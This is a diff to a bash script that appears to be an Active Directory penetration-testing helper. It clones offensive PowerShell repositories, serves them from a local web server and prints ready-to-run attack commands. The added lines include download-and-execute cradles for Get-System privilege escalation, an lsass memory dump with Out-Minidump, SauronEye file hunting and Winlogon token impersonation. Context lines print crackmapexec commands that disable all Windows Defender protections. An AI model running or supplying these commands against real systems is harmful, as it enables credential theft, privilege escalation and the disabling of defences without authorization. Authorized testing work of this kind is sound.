@@ -8,7 +8,7 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-LocalIP="0.0.0.0";		#
+LocalIP="10.10.10.6";		#
 LocalPort="8080";		#
 
 Username="";			#
@@ -29,7 +29,11 @@ PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSy
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
-SecListsRepo="https://github.com/danielmiessler/SecLists.git";
+GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
+SecListsRepo="https://github.com/danielmiessler/SecLists/";
+JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
+
+
 
 LocalRepo="False"
 
@@ -98,6 +102,9 @@ EmpireLocalRepo="$HOME/ADAT/Empire"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 WinPwnLocalRepo="$HOME/ADAT/WinPwn"
+JAWSLocalRepo="$HOME/ADAT/JAWS"
+GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
+
 
 if [ -d "$EmpireLocalRepo" ] 
 then
@@ -158,11 +165,40 @@ else
 	echo -e ""
 fi
 
+if [ -d "$JAWSLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "JAWS is installed, checking if updated to latest version."
+    	cd $JAWSLocalRepo
+    	git pull "https://github.com/411Hall/JAWS.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning JAWS Repo${RESTORE}"
+	git clone --recursive "https://github.com/411Hall/JAWS.git" $HOME/ADAT/JAWS
+	echo -e ""
+fi
+
+if [ -d "$GetSystemTechniquesLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
+    	cd $GetSystemTechniquesLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Get-System-Techniques Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git" $HOME/ADAT/Get-System-Techniques
+	echo -e ""
+fi
 
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -233,6 +269,8 @@ while [ $# -gt 0 ]; do
 		LazagneRepo="http://$LocalIP:$LocalPort/"
 		PowerSploitRepo="http://$LocalIP:$LocalPort/"
 		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
+		JAWSRepo="http://$LocalIP:$LocalPort/"
+		GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
 		LocalRepo="True"
 		Function_LocalRepo;
                 shift
@@ -548,7 +586,7 @@ echo -e ""
 echo -e "${LGREEN}Pywerview${RESTORE}"
 echo -e "${RED}https://github.com/the-useless-one/pywerview${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}# Information Gathering${RESTORE}"
+echo -e "${IBLUE}Information Gathering${RESTORE}"
 echo -e "python3 pywerview.py get-dfsshare -u $Username -p $Password -w $Domain --dc-ip $IP"
 echo -e "python3 pywerview.py get-domainpolicy -u $Username -p $Password -w $Domain --dc-ip $IP"
 echo -e "python3 pywerview.py get-netgroup -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/samaccountname: //' | sort"
@@ -561,7 +599,7 @@ echo -e "python3 pywerview.py get-netou -u $Username -p $Password -w $Domain --d
 echo -e "python3 pywerview.py get-netsite -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/name: //' | sort"
 echo -e "python3 pywerview.py get-netuser -u $Username -p $Password -w $Domain --dc-ip $IP"
 echo -e ""
-echo -e "${IBLUE}# Hunting${RESTORE}"
+echo -e "${IBLUE}Hunting${RESTORE}"
 echo -e "python3 pywerview.py invoke-eventhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
 echo -e "python3 pywerview.py invoke-processhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
 echo -e "python3 pywerview.py invoke-userhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
@@ -614,7 +652,7 @@ echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-M
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL'" ;echo -e " ${YELLOW}# Check Defensive Modules${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL'" ;echo -e " ${YELLOW}# Check if tamper protection is enabled${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}# Turn off all Defender modules${RESTORE}"
+echo -e "${IBLUE}Turn off all Defender modules${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-MpPreference -DisableRealtimeMonitoring \$true;Set-MpPreference -DisableIOAVProtection \$true;Set-MPPreference -DisableBehaviorMonitoring \$true;Set-MPPreference -DisableBlockAtFirstSeen \$true;Set-MPPreference -DisableEmailScanning \$true;Set-MPPReference -DisableScriptScanning \$true;Set-MpPreference -DisableIOAVProtection \$true'"
 echo -e ""
 echo -e ""
@@ -708,6 +746,9 @@ echo -e ""
 echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
 echo -e ""
+echo -e "${IBLUE}Get-System${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
+echo -e ""
 
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "										${LGREEN} Enumeration ${RESTORE}"
@@ -726,6 +767,8 @@ echo -e ""
 echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
 echo -e ""
+echo -e "${IBLUE}JAWS${RESTORE}"
+echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
 echo -e ""
 echo -e ""
 # Network Enumeration
@@ -750,8 +793,27 @@ echo -e ""
 echo -e "${IBLUE}Get-ClipboardContents${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"collection/Get-ClipboardContents.ps1);Get-ClipboardContents"
 echo -e ""
+echo -e "${IBLUE}Invoke-SauronEye${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"collection/Invoke-SauronEye.ps1);Invoke-SauronEye"
+echo -e ""
+echo -e "${IBLUE}Out-Minidump${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"collection/Out-Minidump.ps1);Get-Process lsass | Out-Minidump"
+echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e ""
 
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "										${LGREEN} Token Impersonation ${RESTORE}"
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+#Clipboard
+echo -e "" 
+echo -e "${LGREEN}Create Process with Token${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Get-WinlogonTokenSystem${RESTORE}"
+echo -e "$DownloadMethod "$GetSystemTechniquesRepo"TokenManipulation/Get-WinlogonTokenSystem.ps1);Get-WinlogonTokenSystem"
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 ################################################################################
 # Cleanup	                                                               #
 ################################################################################
